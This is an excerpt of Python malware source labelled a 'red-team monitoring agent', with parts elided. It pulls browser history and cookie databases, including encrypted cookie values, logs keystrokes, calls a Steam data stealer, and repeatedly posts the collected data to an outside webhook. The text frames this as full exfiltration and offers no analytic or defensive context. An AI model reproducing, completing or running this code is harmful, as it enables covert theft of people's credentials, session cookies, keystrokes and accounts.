# =====================================================
# ULTIMATE RED-TEAM MONITORING AGENT v5.1 - FULL EXFIL
# =====================================================
import os
import sys
import time
...
log("=== AGENT v5.1 FULL EXFIL STARTED ===")
        ...
        for profile in profiles:
            ...
            if os.path.exists(history_db):
                try:
                    ...
                    cursor = conn.cursor()
                    content += "\n=== HISTORY (last 50) ===\n"
                    for row in cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50"):
            ...
            if os.path.exists(cookie_db):
                try:
                    ...
                    cursor = conn.cursor()
                    content += "\n=== COOKIES (sample) ===\n"
                    for row in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100"):
                        host, name, enc = row
...
def on_press(key):
    ...
    if len(keylog_buffer) > 400:
        keylog_buffer = keylog_buffer[-400:]
...
def send_to_webhook(payload, files=None, max_retries=3):
    for attempt in range(max_retries):
        try:
            r = requests.post(DEFAULT_WEBHOOK, json=payload, files=files, timeout=30)
            ...
            log(f"Webhook error: {type(e).__name__}")
            time.sleep(5)
    return False
...
def main_loop(script_path):
    ...
    while True:
        try:
            ...
            info["steam"] = steal_steam_data()  # keep your original steam function
            info["keylog"] = "".join(keylog_buffer[-400:]) or "N/A"

            txt_attachments = extract_all_browser_data()

            payload = {
                "content": f"# `{hostname}`\n**AGENT v5.1 REPORT** | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n```json\n{json.dumps(info, default=str, indent=2)[:1900]}\n```"
            }
...
# Steam stealer (kept from original)
